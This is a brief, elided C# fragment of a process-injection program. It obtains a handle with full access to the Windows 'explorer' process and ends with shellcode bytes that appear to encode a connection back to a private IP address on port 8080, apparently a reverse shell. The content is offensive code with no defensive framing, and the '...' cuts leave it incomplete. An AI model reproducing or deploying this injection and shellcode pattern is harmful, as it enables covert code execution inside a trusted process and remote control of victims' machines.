...
namespace process_injection
{
    class Program
    {
        ...
        {
            Process[] proc_a = Process.GetProcessesByName("explorer");
            Process proc = proc_a[0];
            int proc_pid = proc.Id;
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, proc_pid);
...
0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x1f,0x90,0xc0,0xa8,0x31,0x47,0x41,0x54,
